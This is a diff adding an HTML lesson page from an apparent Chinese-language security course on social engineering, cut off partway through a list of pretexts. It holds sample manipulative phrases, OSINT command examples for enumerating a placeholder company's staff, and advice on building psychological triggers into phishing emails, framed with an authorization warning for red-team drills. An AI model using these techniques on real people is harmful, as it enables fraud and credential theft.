@@ -1,0 +1,1035 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Stage 08 — 社會工程學 | SEC_TRACK</title>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@300;400;500;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0f0907;--bg2:#130b08;--bg3:#180e0a;--sur:#201410;--bdr:#2e1e17;
+  --acc:#ff7055;--acc2:#d44d30;--txt:#f0e6e0;--txt2:#a08078;--txt3:#604840;
+  --red:#f05252;--grn:#3ecf8e;--cyn:#22d3ee;--ylw:#fbbf24;--pur:#a78bfa;--rose:#fb7185;
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:'Noto Sans TC',sans-serif;background:var(--bg);color:var(--txt);min-height:100vh;}
+body::before{content:'';position:fixed;inset:0;background:
+  radial-gradient(ellipse 60% 40% at 8% 0%,rgba(255,112,85,.05) 0%,transparent 55%),
+  radial-gradient(ellipse 40% 30% at 92% 100%,rgba(212,77,48,.04) 0%,transparent 55%);
+  pointer-events:none;z-index:0;}
+nav{position:fixed;top:0;left:0;right:0;z-index:100;height:60px;display:flex;align-items:center;justify-content:space-between;padding:0 36px;background:rgba(15,9,7,.95);backdrop-filter:blur(14px);border-bottom:1px solid var(--bdr);}
+.n-logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:.95rem;color:var(--acc);text-decoration:none;}
+.n-logo span{color:var(--txt3);}
+.n-mid{display:flex;align-items:center;gap:10px;}
+.s-pill{font-family:'JetBrains Mono',monospace;font-size:.62rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:3px 10px;border-radius:20px;background:rgba(255,112,85,.1);color:var(--acc);border:1px solid rgba(255,112,85,.28);}
+.n-sname{font-size:.8rem;color:var(--txt2);}
+.n-back{font-size:.8rem;color:var(--txt3);text-decoration:none;transition:color .2s;}
+.n-back:hover{color:var(--acc);}
+.layout{display:grid;grid-template-columns:280px 1fr;min-height:100vh;padding-top:60px;}
+.sidebar{position:sticky;top:60px;height:calc(100vh - 60px);overflow-y:auto;background:var(--bg2);border-right:1px solid var(--bdr);display:flex;flex-direction:column;z-index:10;}
+.sidebar::-webkit-scrollbar{width:3px;}
+.sidebar::-webkit-scrollbar-thumb{background:var(--bdr);}
+.sb-h{padding:22px 22px 16px;border-bottom:1px solid var(--bdr);flex-shrink:0;}
+.sb-tag{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--acc);letter-spacing:.14em;text-transform:uppercase;margin-bottom:6px;}
+.sb-title{font-size:.88rem;font-weight:700;line-height:1.45;margin-bottom:13px;}
+.sb-meta{display:flex;gap:16px;}
+.sm-item{display:flex;flex-direction:column;gap:2px;}
+.sm-val{font-family:'JetBrains Mono',monospace;font-size:.82rem;font-weight:700;color:var(--acc);}
+.sm-key{font-size:.62rem;color:var(--txt3);letter-spacing:.06em;text-transform:uppercase;}
+.sb-nav{flex:1;overflow-y:auto;padding:6px 0;}
+.ch-btn{width:100%;display:flex;align-items:center;gap:9px;padding:9px 22px;background:none;border:none;border-bottom:1px solid rgba(46,30,23,.7);color:var(--txt2);font-family:'Noto Sans TC',sans-serif;font-size:.79rem;font-weight:500;cursor:pointer;text-align:left;transition:color .18s,background .18s;}
+.ch-btn:hover{color:var(--txt);background:var(--bg3);}
+.ch-btn.cact{color:var(--acc);}
+.ch-num{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--txt3);min-width:26px;flex-shrink:0;}
+.ch-btn.cact .ch-num{color:var(--acc);}
+.ch-arr{font-size:.52rem;color:var(--txt3);transition:transform .2s;flex-shrink:0;}
+.ch-btn.copen .ch-arr{transform:rotate(90deg);}
+.ls-list{display:none;flex-direction:column;background:rgba(0,0,0,.15);}
+.ls-list.lopen{display:flex;}
+.ls-btn{display:flex;align-items:flex-start;gap:9px;padding:7px 22px 7px 44px;background:none;border:none;border-bottom:1px solid rgba(46,30,23,.4);color:var(--txt3);font-family:'Noto Sans TC',sans-serif;font-size:.74rem;cursor:pointer;text-align:left;width:100%;transition:color .18s,background .18s;line-height:1.4;}
+.ls-btn:hover{color:var(--txt2);background:rgba(255,112,85,.03);}
+.ls-btn.lact{color:var(--acc);background:rgba(255,112,85,.06);}
+.ls-btn.ldone{color:var(--txt3);}
+.ls-dot{width:5px;height:5px;border-radius:50%;background:var(--bdr);flex-shrink:0;margin-top:5px;transition:background .2s;}
+.ls-btn.lact .ls-dot{background:var(--acc);}
+.ls-btn.ldone .ls-dot{background:var(--acc);}
+.sb-f{padding:13px 22px;border-top:1px solid var(--bdr);flex-shrink:0;}
+.pr{display:flex;justify-content:space-between;font-size:.68rem;color:var(--txt3);margin-bottom:6px;}
+.pt{height:3px;background:var(--bdr);border-radius:2px;overflow:hidden;}
+.pf{height:100%;background:var(--acc);border-radius:2px;transition:width .4s;}
+.main{position:relative;z-index:1;display:flex;flex-direction:column;}
+.lh{padding:38px 56px 30px;border-bottom:1px solid var(--bdr);background:linear-gradient(180deg,rgba(255,112,85,.03) 0%,transparent 100%);}
+.lh-crumb{font-family:'JetBrains Mono',monospace;font-size:.63rem;color:var(--txt3);letter-spacing:.08em;margin-bottom:11px;}
+.lh-crumb em{color:var(--acc);font-style:normal;}
+.lh-title{font-size:1.6rem;font-weight:800;letter-spacing:-.02em;line-height:1.2;margin-bottom:11px;}
+.lh-chips{display:flex;gap:8px;flex-wrap:wrap;}
+.chip{padding:3px 11px;border-radius:20px;font-size:.67rem;font-family:'JetBrains Mono',monospace;letter-spacing:.04em;border:1px solid var(--bdr);color:var(--txt3);}
+.chip.ac{border-color:rgba(255,112,85,.4);color:var(--acc);}
+.cw{padding:38px 56px 80px;max-width:880px;}
+.cb{display:none;}
+.cb.on{display:block;animation:rise .25s ease both;}
+@keyframes rise{from{opacity:0;transform:translateY(7px);}to{opacity:1;transform:none;}}
+h2{font-size:1.25rem;font-weight:800;letter-spacing:-.01em;margin:36px 0 13px;color:var(--txt);display:flex;align-items:center;gap:10px;}
+h2::before{content:'';display:inline-block;width:3px;height:1.1em;border-radius:2px;background:var(--acc);flex-shrink:0;}
+h2:first-child{margin-top:0;}
+h3{font-size:.98rem;font-weight:700;margin:22px 0 9px;color:var(--txt);}
+p{font-size:.9rem;line-height:1.85;color:var(--txt2);margin-bottom:11px;font-weight:300;}
+strong{color:var(--txt);font-weight:600;}
+code{font-family:'JetBrains Mono',monospace;font-size:.8em;background:var(--sur);border:1px solid var(--bdr);padding:1px 6px;border-radius:3px;color:var(--acc);}
+.note{border-left:3px solid;padding:13px 17px;margin:18px 0;border-radius:0 4px 4px 0;}
+.note-lbl{font-family:'JetBrains Mono',monospace;font-size:.58rem;letter-spacing:.12em;text-transform:uppercase;font-weight:700;margin-bottom:6px;}
+.note p{margin:0;font-size:.86rem;line-height:1.7;}
+.note.tip{border-color:var(--acc);background:rgba(255,112,85,.06);}
+.note.tip .note-lbl{color:var(--acc);}
+.note.warn{border-color:var(--ylw);background:rgba(251,191,36,.06);}
+.note.warn .note-lbl{color:var(--ylw);}
+.note.sec{border-color:var(--grn);background:rgba(62,207,142,.06);}
+.note.sec .note-lbl{color:var(--grn);}
+.note.danger{border-color:var(--red);background:rgba(240,82,82,.07);}
+.note.danger .note-lbl{color:var(--red);}
+.note.law{border-color:var(--pur);background:rgba(167,139,250,.07);}
+.note.law .note-lbl{color:var(--pur);}
+.note.psy{border-color:var(--cyn);background:rgba(34,211,238,.05);}
+.note.psy .note-lbl{color:var(--cyn);}
+.cblock{background:#080402;border:1px solid var(--bdr);border-radius:6px;margin:16px 0;overflow:hidden;}
+.ctop{display:flex;align-items:center;justify-content:space-between;padding:7px 15px;background:rgba(20,10,6,.8);border-bottom:1px solid var(--bdr);}
+.clang{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--txt3);letter-spacing:.1em;text-transform:uppercase;}
+.ccopy{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--txt3);background:none;border:none;cursor:pointer;transition:color .2s;}
+.ccopy:hover{color:var(--acc);}
+pre{padding:16px 20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:.78rem;line-height:1.75;color:#ddd0c8;}
+pre .kw{color:#c792ea;}pre .fn{color:#82aaff;}pre .st{color:#c3e88d;}pre .cm{color:#3a2820;font-style:italic;}
+pre .nu{color:#f78c6c;}pre .tg{color:#f07178;}pre .at{color:#ffcb6b;}
+pre .sl{color:#89ddff;}pre .op{color:#89ddff;}pre .hl{background:rgba(255,112,85,.12);border-radius:2px;padding:0 2px;}
+.tbl{overflow-x:auto;margin:16px 0;}
+table.t{width:100%;border-collapse:collapse;font-size:.82rem;}
+table.t th{background:var(--sur);padding:9px 14px;text-align:left;font-size:.63rem;font-family:'JetBrains Mono',monospace;color:var(--txt3);letter-spacing:.08em;text-transform:uppercase;border:1px solid var(--bdr);}
+table.t td{padding:9px 14px;border:1px solid var(--bdr);color:var(--txt2);font-weight:300;vertical-align:top;line-height:1.55;}
+table.t tr:hover td{background:var(--bg3);}
+.mc{font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--acc);}
+.kg{display:grid;grid-template-columns:repeat(2,1fr);gap:2px;background:var(--bdr);border:1px solid var(--bdr);margin:16px 0;}
+.kt{background:var(--bg2);padding:14px 17px;}
+.kt-n{font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--acc);font-weight:700;margin-bottom:5px;}
+.kt-d{font-size:.79rem;color:var(--txt2);line-height:1.6;font-weight:300;}
+.ilist{display:flex;flex-direction:column;border:1px solid var(--bdr);border-radius:4px;overflow:hidden;margin:16px 0;}
+.il-item{display:flex;align-items:flex-start;gap:13px;padding:12px 17px;border-bottom:1px solid var(--bdr);transition:background .15s;}
+.il-item:last-child{border-bottom:none;}
+.il-item:hover{background:var(--bg3);}
+.il-num{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--acc);min-width:24px;flex-shrink:0;padding-top:2px;font-weight:700;}
+.il-txt{font-size:.85rem;color:var(--txt2);line-height:1.6;font-weight:300;}
+.il-txt strong{color:var(--txt);}
+.atkflow{display:flex;flex-direction:column;gap:3px;margin:18px 0;}
+.af-step{display:flex;align-items:flex-start;gap:13px;padding:13px 16px;background:var(--sur);border:1px solid var(--bdr);border-radius:4px;position:relative;}
+.af-step::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--bdr);border-radius:4px 0 0 4px;}
+.af-step.s1::before{background:var(--acc);}
+.af-step.s2::before{background:var(--ylw);}
+.af-step.s3::before{background:var(--cyn);}
+.af-step.s4::before{background:var(--grn);}
+.af-step.s5::before{background:var(--rose);}
+.af-step.s6::before{background:var(--pur);}
+.af-n{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--txt3);font-weight:700;min-width:44px;flex-shrink:0;padding-top:2px;letter-spacing:.04em;}
+.af-t{font-size:.82rem;font-weight:700;color:var(--txt);margin-bottom:4px;}
+.af-d{font-size:.78rem;color:var(--txt2);line-height:1.55;font-weight:300;}
+.quiz{background:var(--bg3);border:1px solid var(--bdr);border-radius:6px;padding:22px;margin:26px 0;}
+.q-lbl{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--ylw);letter-spacing:.12em;text-transform:uppercase;margin-bottom:10px;}
+.q-q{font-size:.9rem;font-weight:600;margin-bottom:13px;line-height:1.5;color:var(--txt);}
+.q-opts{display:flex;flex-direction:column;gap:6px;}
+.qo{display:flex;align-items:flex-start;gap:10px;padding:8px 13px;border:1px solid var(--bdr);border-radius:4px;cursor:pointer;font-size:.83rem;color:var(--txt2);transition:all .18s;line-height:1.5;}
+.qo:hover{border-color:var(--acc);color:var(--txt);}
+.qo.ok{border-color:var(--acc);background:rgba(255,112,85,.07);color:var(--acc);}
+.qo.bad{border-color:var(--red);background:rgba(240,82,82,.07);color:var(--red);}
+.qo-k{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--txt3);min-width:16px;padding-top:1px;flex-shrink:0;}
+.q-exp{display:none;margin-top:12px;padding:11px 14px;background:rgba(255,112,85,.05);border-left:2px solid var(--acc);border-radius:0 4px 4px 0;font-size:.82rem;color:var(--txt2);line-height:1.65;}
+.q-exp.on{display:block;}
+.done-banner{background:linear-gradient(135deg,rgba(255,112,85,.07),rgba(212,77,48,.05));border:1px solid rgba(255,112,85,.2);border-radius:6px;padding:28px;margin:34px 0 14px;text-align:center;}
+.done-banner h3{font-size:1.1rem;font-weight:800;color:var(--acc);margin-bottom:8px;}
+.done-banner p{font-size:.87rem;margin-bottom:20px;}
+.btn-row{display:flex;gap:11px;justify-content:center;flex-wrap:wrap;}
+.btn-p{display:inline-block;padding:10px 24px;background:var(--acc);color:#fff;text-decoration:none;font-weight:700;font-size:.84rem;border-radius:4px;transition:all .2s;}
+.btn-p:hover{background:#ff8870;transform:translateY(-1px);}
+.btn-g{display:inline-block;padding:10px 24px;border:1px solid var(--bdr);color:var(--txt2);text-decoration:none;font-size:.84rem;border-radius:4px;transition:all .2s;}
+.btn-g:hover{border-color:var(--acc);color:var(--acc);}
+.lnav{display:flex;justify-content:space-between;align-items:center;padding:22px 56px;border-top:1px solid var(--bdr);background:var(--bg2);position:sticky;bottom:0;z-index:5;}
+.lb{display:flex;align-items:center;gap:7px;padding:8px 18px;border:1px solid var(--bdr);border-radius:4px;background:none;color:var(--txt2);font-size:.82rem;cursor:pointer;font-family:'Noto Sans TC',sans-serif;transition:all .18s;}
+.lb:hover:not(:disabled){border-color:var(--acc);color:var(--acc);}
+.lb.pri{background:var(--acc);color:#fff;border-color:var(--acc);font-weight:700;}
+.lb.pri:hover:not(:disabled){background:#ff8870;}
+.lb:disabled{opacity:.2;cursor:not-allowed;}
+.ln-mid{text-align:center;}
+.ln-cnt{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--txt3);}
+.ln-sub{font-size:.75rem;color:var(--txt3);margin-top:3px;max-width:260px;}
+@media(max-width:900px){.layout{grid-template-columns:1fr;}.sidebar{position:static;height:auto;}.lh,.cw{padding-left:20px;padding-right:20px;}.lnav{padding:16px 20px;}.kg{grid-template-columns:1fr;}.ln-sub{display:none;}}
+</style>
+</head>
+<body>
+<nav>
+  <a href="index.html" class="n-logo">SEC<span>_</span>TRACK</a>
+  <div class="n-mid"><span class="s-pill">STAGE 08</span><span class="n-sname">社會工程學</span></div>
+  <a href="index.html" class="n-back">&#8592; 首頁</a>
+</nav>
+<div class="layout">
+<aside class="sidebar">
+  <div class="sb-h">
+    <div class="sb-tag">STAGE 08 · 3週</div>
+    <div class="sb-title">社會工程學與<br>釣魚攻擊技術</div>
+    <div class="sb-meta">
+      <div class="sm-item"><span class="sm-val">5</span><span class="sm-key">章節</span></div>
+      <div class="sm-item"><span class="sm-val">22</span><span class="sm-key">課程</span></div>
+      <div class="sm-item"><span class="sm-val">3週</span><span class="sm-key">時長</span></div>
+    </div>
+  </div>
+  <div class="sb-nav">
+    <div><button class="ch-btn copen cact" onclick="toggleCh(this,'ch1')"><span class="ch-num">CH1</span><span class="ch-name">社工學原理</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list lopen" id="ch1">
+      <button class="ls-btn lact" onclick="go('l1-1',this)"><span class="ls-dot"></span>社會工程學概論與攻擊框架</button>
+      <button class="ls-btn" onclick="go('l1-2',this)"><span class="ls-dot"></span>影響力原理：六大心理觸發機制</button>
+      <button class="ls-btn" onclick="go('l1-3',this)"><span class="ls-dot"></span>目標偵察：OSINT 人員情報收集</button>
+      <button class="ls-btn" onclick="go('l1-4',this)"><span class="ls-dot"></span>借口構建（Pretexting）技術</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch2')"><span class="ch-num">CH2</span><span class="ch-name">釣魚攻擊技術</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch2">
+      <button class="ls-btn" onclick="go('l2-1',this)"><span class="ls-dot"></span>釣魚郵件：設計與投遞技術</button>
+      <button class="ls-btn" onclick="go('l2-2',this)"><span class="ls-dot"></span>魚叉式釣魚（Spear Phishing）</button>
+      <button class="ls-btn" onclick="go('l2-3',this)"><span class="ls-dot"></span>GoPhish 框架：自動化釣魚演練</button>
+      <button class="ls-btn" onclick="go('l2-4',this)"><span class="ls-dot"></span>釣魚頁面製作：Evilginx / Gophish</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch3')"><span class="ch-num">CH3</span><span class="ch-name">語音與實體社工</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch3">
+      <button class="ls-btn" onclick="go('l3-1',this)"><span class="ls-dot"></span>Vishing（語音釣魚）腳本設計</button>
+      <button class="ls-btn" onclick="go('l3-2',this)"><span class="ls-dot"></span>尾隨進入（Tailgating）與實體滲透</button>
+      <button class="ls-btn" onclick="go('l3-3',this)"><span class="ls-dot"></span>USB 丟棄攻擊與惡意設備</button>
+      <button class="ls-btn" onclick="go('l3-4',this)"><span class="ls-dot"></span>深偽技術（Deepfake）與 AI 社工</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch4')"><span class="ch-num">CH4</span><span class="ch-name">釣魚基礎設施</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch4">
+      <button class="ls-btn" onclick="go('l4-1',this)"><span class="ls-dot"></span>域名策略：釣魚域選購與配置</button>
+      <button class="ls-btn" onclick="go('l4-2',this)"><span class="ls-dot"></span>Evilginx3：中間人反向代理釣魚</button>
+      <button class="ls-btn" onclick="go('l4-3',this)"><span class="ls-dot"></span>釣魚郵件繞過 SPF / DKIM / DMARC</button>
+      <button class="ls-btn" onclick="go('l4-4',this)"><span class="ls-dot"></span>Payload 投遞：宏 / LNK / ISO</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch5')"><span class="ch-num">CH5</span><span class="ch-name">防禦與意識培訓</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch5">
+      <button class="ls-btn" onclick="go('l5-1',this)"><span class="ls-dot"></span>社工演練報告：數據與建議</button>
+      <button class="ls-btn" onclick="go('l5-2',this)"><span class="ls-dot"></span>員工安全意識培訓設計</button>
+      <button class="ls-btn" onclick="go('l5-3',this)"><span class="ls-dot"></span>技術防禦：郵件閘道 / MFA / FIDO2</button>
+    </div></div>
+  </div>
+  <div class="sb-f">
+    <div class="pr"><span>學習進度</span><span id="pct">0%</span></div>
+    <div class="pt"><div class="pf" id="pf" style="width:0%"></div></div>
+  </div>
+</aside>
+<main class="main">
+  <div class="lh">
+    <div class="lh-crumb" id="crumb">STAGE 08 &gt; CH1 &gt; <em>課程 1</em></div>
+    <h1 class="lh-title" id="ltitle">社會工程學概論與攻擊框架</h1>
+    <div class="lh-chips">
+      <span class="chip ac" id="chip1">方法論</span>
+      <span class="chip" id="chip2">20 分鐘</span>
+    </div>
+  </div>
+  <div class="cw">
+
+<!-- ===== CH1: 社工學原理 ===== -->
+
+<!-- L1-1 概論 -->
+<div class="cb on" id="l1-1">
+<h2>社會工程學概論與攻擊框架</h2>
+<p>社會工程學（Social Engineering）是利用人類的心理弱點、信任機制和行為習慣，誘使目標個人自願提供信息或執行特定動作的攻擊藝術。它繞過技術防禦，直接攻擊「人」這個最脆弱的環節。</p>
+
+<h3>為什麼社工攻擊如此有效？</h3>
+<p>根據 Verizon DBIR 報告，<strong>超過 80%</strong> 的資料洩露涉及人為因素——社工攻擊、憑證竊取或釣魚郵件。組織可以修補系統漏洞，但無法「修補」人的心理。即使企業有最先進的技術防禦，一封精心設計的釣魚郵件仍可能讓員工點擊並交出憑證。</p>
+
+<h3>社工攻擊完整框架（SEEF）</h3>
+<div class="atkflow">
+  <div class="af-step s1"><span class="af-n">PHASE 1</span><div><div class="af-t">情報收集（Intelligence Gathering）</div><div class="af-d">通過 OSINT 工具（LinkedIn、GitHub、WHOIS、Shodan）收集目標組織架構、員工姓名職位、業務流程、技術棧、合作夥伴等信息。信息越豐富，後續攻擊越有針對性。</div></div></div>
+  <div class="af-step s2"><span class="af-n">PHASE 2</span><div><div class="af-t">目標選定（Target Identification）</div><div class="af-d">根據目標確定最佳攻擊對象：財務人員（轉帳詐騙）、IT 人員（密碼重置）、高管助理（魚叉釣魚）、前台接待（實體社工）。選對目標事半功倍。</div></div></div>
+  <div class="af-step s3"><span class="af-n">PHASE 3</span><div><div class="af-t">借口設計（Pretexting）</div><div class="af-d">構建可信的虛假身份和情景：假扮 IT 支援人員、審計師、合作廠商、高管等。設計具體的對話腳本，包括如何建立信任、如何引導對話，以及應對常見疑問的回應。</div></div></div>
+  <div class="af-step s4"><span class="af-n">PHASE 4</span><div><div class="af-t">攻擊執行（Attack Execution）</div><div class="af-d">通過選定的攻擊向量執行：釣魚郵件、Vishing（語音釣魚）、Smishing（SMS 釣魚）、實體滲透、USB 丟棄。在執行過程中靈活運用心理影響技術。</div></div></div>
+  <div class="af-step s5"><span class="af-n">PHASE 5</span><div><div class="af-t">目標達成（Objective Achievement）</div><div class="af-d">獲得憑證（用於內網滲透）、惡意代碼執行（初始立足點）、機密信息洩露、財務欺詐授權。社工演練中需完整記錄哪些員工被成功社工，以生成報告。</div></div></div>
+  <div class="af-step s6"><span class="af-n">PHASE 6</span><div><div class="af-t">報告與培訓（Report &amp; Training）</div><div class="af-d">整理演練數據（點擊率、憑證提交率、通報率），分析薄弱環節，提供具體的意識培訓建議和技術防禦措施。社工演練的最終目的是提升組織防禦能力。</div></div></div>
+</div>
+
+<div class="note law">
+  <div class="note-lbl">授權與法律邊界</div>
+  <p>社工演練在許多國家涉及詐騙罪、偽造文件、不法侵入等法律風險。<strong>必須取得明確的書面授權</strong>，包括：（1）客戶聲明書（Statement of Work）明確列出允許的攻擊向量；（2）緊急中止程序（如員工向真實IT部門求助時的通知機制）；（3）明確排除某些敏感人員（如已知有心理健康問題的員工）。沒有授權的任何社工行為均屬犯罪。</p>
+</div>
+</div>
+
+<!-- L1-2 影響力原理 -->
+<div class="cb" id="l1-2">
+<h2>影響力原理：六大心理觸發機制</h2>
+<p>Robert Cialdini 在《影響力》中總結了六大影響力原理，這些心理機制被社工攻擊者廣泛利用。理解這些原理是設計有效社工攻擊和防禦培訓的基礎。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>影響力原理</th><th>心理機制</th><th>社工攻擊應用</th><th>典型話術</th></tr></thead>
+    <tbody>
+      <tr><td><strong>互惠（Reciprocity）</strong></td><td>收到恩惠後產生回報義務感</td><td>先提供「免費幫助」，再要求敏感信息</td><td>「我剛幫你解決了郵箱問題，你能確認一下帳號信息讓我登記嗎？」</td></tr>
+      <tr><td><strong>承諾一致（Commitment）</strong></td><td>人傾向於保持言行與已有承諾一致</td><td>先獲得小承諾，再逐步升級要求</td><td>「你之前同意配合我們的安全審查，所以現在需要你確認一下密碼。」</td></tr>
+      <tr><td><strong>社會認同（Social Proof）</strong></td><td>不確定時跟隨大多數人的行為</td><td>聲稱其他同事已經配合</td><td>「你們部門的同事都已經完成驗證了，就差你一個。」</td></tr>
+      <tr><td><strong>權威（Authority）</strong></td><td>服從權威人物的指令</td><td>假冒高管、IT部門、執法機構</td><td>「我是 CEO 辦公室的，張總要求你立即處理這個緊急事項。」</td></tr>
+      <tr><td><strong>稀缺（Scarcity）</strong></td><td>稀缺資源更具吸引力，時間壓力促使倉促決策</td><td>製造緊迫感，阻止目標理性思考</td><td>「你的帳號將在 15 分鐘後被鎖定，請立即點擊鏈接驗證身份。」</td></tr>
+      <tr><td><strong>喜好（Liking）</strong></td><td>更容易被自己喜歡或信任的人影響</td><td>建立個人連結感、共同點、讚美目標</td><td>「我知道你是工程部門最厲害的，所以特地來請教你這個技術問題。」</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="note psy">
+  <div class="note-lbl">組合使用心理觸發器</div>
+  <p>最有效的社工攻擊通常同時使用多種觸發機制。例如一封釣魚郵件可以同時使用：<strong>權威</strong>（假冒 CEO 或 IT 部門）+ <strong>稀缺/緊迫</strong>（「帳號將在 24 小時內停用」）+ <strong>社會認同</strong>（「所有員工都已完成此更新」）。三重心理壓力使目標難以保持理性分析。在撰寫釣魚郵件時，識別並刻意融入至少 2-3 個觸發機制。</p>
+</div>
+</div>
+
+<!-- L1-3 OSINT 人員情報 -->
+<div class="cb" id="l1-3">
+<h2>目標偵察：OSINT 人員情報收集</h2>
+<p>在社工攻擊前，針對目標組織和個人的深入情報收集（OSINT）是提高攻擊成功率的關鍵。收集的信息越詳細，構建的借口越可信。</p>
+
+<div class="kg">
+  <div class="kt"><div class="kt-n">LinkedIn — 組織架構與人員</div><div class="kt-d">枚舉員工姓名、職位、部門、直屬關係。通過「In Common」找到目標的共同聯繫。查看職位描述推斷技術棧（「使用 Salesforce / SAP / AWS」）。舊版 LinkedIn API 可批量導出員工數據。</div></div>
+  <div class="kt"><div class="kt-n">GitHub — 技術信息洩露</div><div class="kt-d">搜索公司域名郵件（@company.com）找到開發人員帳號，查看其公開倉庫中是否有硬編碼憑證、內部 API 端點、基礎設施信息。<code>site:github.com "company.com" password</code></div></div>
+  <div class="kt"><div class="kt-n">Hunter.io / Clearbit — 郵件格式</div><div class="kt-d">自動偵測公司郵件格式（firstname.lastname@company.com 或 f.lastname@company.com）並驗證郵件有效性。一旦知道格式，可以構建任意員工的郵件地址用於魚叉釣魚。</div></div>
+  <div class="kt"><div class="kt-n">Maltego — 可視化關聯分析</div><div class="kt-d">將 OSINT 數據視覺化為關係圖：域名 → DNS → IP → 組織 → 員工 → 社交媒體帳號。Transform 自動執行多個 OSINT 查詢，適合複雜目標的全面偵察。</div></div>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">人員 OSINT 工具命令速查</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── theHarvester：郵件、域名、人員一站式收集 ───</span>
+theHarvester -d targetcorp.com -b all -l 200 -f report.html
+<span class="cm"># -d 目標域名  -b 數據源（google/linkedin/bing/hunter等）  -l 限制結果數</span>
+<span class="cm"># 輸出：員工郵件、子域名、IP地址</span>
+
+<span class="cm"># ─── LinkedIn 員工枚舉 ───</span>
+<span class="cm"># linkedin2username（Python 工具）：根據公司名稱枚舉員工並生成常見用戶名格式</span>
+python3 linkedin2username.py -c "Target Corp" -n 50
+<span class="cm"># 生成格式：jdoe, john.doe, johnd, j.doe 等</span>
+
+<span class="cm"># ─── 郵件格式發現與驗證 ───</span>
+<span class="cm"># Hunter.io CLI</span>
+curl "https://api.hunter.io/v2/domain-search?domain=targetcorp.com&api_key=YOUR_KEY"
+
+<span class="cm"># ─── 已洩露憑證搜索 ───</span>
+<span class="cm"># Dehashed（需付費），或使用：</span>
+<span class="cm"># 搜索已洩露的數據庫：</span>
+<span class="cm"># haveibeenpwned API：https://haveibeenpwned.com/API/v3</span>
+curl "https://haveibeenpwned.com/api/v3/breachedaccount/jdoe@targetcorp.com" \
+  -H "hibp-api-key: YOUR_KEY"
+<span class="cm"># 找到已洩露帳號 → 嘗試密碼重用（Credential Stuffing）</span>
+
+<span class="cm"># ─── 社交媒體情報 ───</span>
+<span class="cm"># sherlock：跨平台用戶名搜索</span>
+python3 sherlock.py "john.doe"       <span class="cm"># 在 300+ 平台搜索該用戶名</span>
+<span class="cm"># 找到目標的 Twitter/Facebook/Instagram → 個人愛好、家庭成員、近期活動</span>
+<span class="cm"># 這些信息用於構建更可信的借口和建立個人連結感（Rapport Building）</span>
+
+<span class="cm"># ─── Google Dork 人員信息搜索 ───</span>
+<span class="cm"># 搜索公司員工發布的文件（可能含姓名、職位、聯繫方式）</span>
+site:targetcorp.com filetype:pdf "confidential"
+site:targetcorp.com "employees" OR "staff directory"
+"@targetcorp.com" site:linkedin.com
+<span class="cm"># 搜索職位招聘廣告（推斷技術棧和系統）</span>
+site:linkedin.com "targetcorp" "security engineer" "responsibilities"</pre>
+</div>
+</div>
+
+<!-- L1-4 Pretexting -->
+<div class="cb" id="l1-4">
+<h2>借口構建（Pretexting）技術</h2>
+<p>Pretexting 是創建虛假情景和身份，為社工攻擊提供「合理」的框架。一個好的借口需要：與目標業務環境高度相關、利用已收集的 OSINT 信息增加可信度、設計完整的對話流程，包括應對質疑的回應。</p>
+
+<div class="ilist">
+  <div class="il-item"><span class="il-num">01</span><div class="il-txt"><strong>IT 技術支援</strong> — 最常用的借口。假冒內部 IT 人員或外包 IT 公司，以「系統升級」「帳號安全驗證」「VPN 配置」等理由索取憑證或誘使安裝軟件。成功率高，因為員工習慣於服從 IT 指令。</div></div>
+  <div class="il-item"><span class="il-num">02</span><div class="il-txt"><strong>高管指令（BEC — Business Email Compromise）</strong> — 假冒 CEO/CFO 向財務人員發出緊急轉帳指令。2023 年 FBI 數據顯示，BEC 詐騙年損失超過 27 億美元，是最具財務破壞力的社工攻擊類型。</div></div>
+  <div class="il-item"><span class="il-num">03</span><div class="il-txt"><strong>供應商 / 合作夥伴</strong> — 假冒目標組織已知的供應商（如辦公室設備維修、雲服務提供商）。事先通過 OSINT 了解真實供應商名稱可大幅提升可信度。</div></div>
+  <div class="il-item"><span class="il-num">04</span><div class="il-txt"><strong>新員工 / 人力資源</strong> — 假扮新入職員工（需要網絡訪問幫助），或假冒 HR 部門發送「年度調查問卷」「薪資調整確認」等郵件。目標通常對新員工更有耐心。</div></div>
+  <div class="il-item"><span class="il-num">05</span><div class="il-txt"><strong>監管機構 / 審計師</strong> — 假冒稅務局、行業監管機構、第三方審計師。「法規合規」話題製造強烈的緊迫感和服從壓力，特別對法務、財務部門員工有效。</div></div>
